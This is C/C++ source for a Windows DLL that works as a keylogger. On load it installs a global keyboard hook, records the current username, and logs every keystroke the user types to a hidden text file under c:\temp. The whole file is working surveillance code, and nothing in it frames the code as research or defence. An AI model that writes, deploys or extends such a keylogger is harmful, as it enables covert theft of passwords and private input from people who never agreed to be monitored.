#include <windows.h>
#include <stdio.h>

#include <Lmcons.h>
#include <iostream>


#define DLL_INTERFACE __declspec(dllexport) 

static HHOOK hhookKeyb;
static bool shift = false;
static bool lastEnter = false;
static char str[UNLEN + 64] = "";

static const char logname[] = "c:\\temp\\rep.txt";

void log(char* tekst, bool newline = true)
{
    FILE* plik;
    plik = fopen(logname, "at+");
    fprintf(plik, "%s%s", tekst, newline ? "\n" : "");
    fclose(plik);
}

// HELP: https://learn.microsoft.com/en-us/windows/win32/winmsg/keyboardproc
LRESULT DLL_INTERFACE KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
#ifdef _DEBUG
    sprintf(str, "KeyboardProc(%d, %d, 0x%08X), shift: %s", nCode, wParam, lParam, shift ? "ON" : "OFF");
    log(str);
#endif
    memset(str, 0, sizeof(str));
    int repeat_cnt = (lParam & 0xffff);
    bool previousState = (lParam & 0x40000000) >> 30;
    if (previousState) {
        // don't log repeated characters
        return CallNextHookEx(hhookKeyb, nCode, wParam, lParam);
    }
    if (wParam == 16) {
        shift = ((lParam >> 31) == 0);
        return CallNextHookEx(hhookKeyb, nCode, wParam, lParam);
    }
    else if (nCode < 0) {
        return CallNextHookEx(hhookKeyb, nCode, wParam, lParam);
    }
    else if ((lParam & 0x80000000) != 0) {
        return CallNextHookEx(hhookKeyb, nCode, wParam, lParam);
    }

    if (wParam >= 'A' && wParam <= 'z') {
        if (shift) {
            wParam = toupper(wParam);
        }
        else {
            wParam = tolower(wParam);
        }
    }
    if (wParam == 13) {
        if (lastEnter == false) {
            log("\n");
        }
        lastEnter = true;
    }
    else {
        //sprintf(str, "%c%d ", wParam, previousState);
        sprintf(str, "%c", wParam);
        lastEnter = false;
    }
    log(str, false);
    return CallNextHookEx(hhookKeyb, nCode, wParam, lParam);
}


BOOL WINAPI DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);

    static HINSTANCE hinstDLL = hModule;
    static HOOKPROC hkprcKeyb;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        sprintf_s(str, UNLEN+64, "DLL_PROCESS_ATTACH, user: %s", username);
        log(str);
        hhookKeyb = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hinstDLL, 0);
        break;
    case DLL_PROCESS_DETACH:
        log("DLL_PROCESS_DETACH\n");
        UnhookWindowsHookEx(hhookKeyb);
        break;
    }
    return TRUE;
}
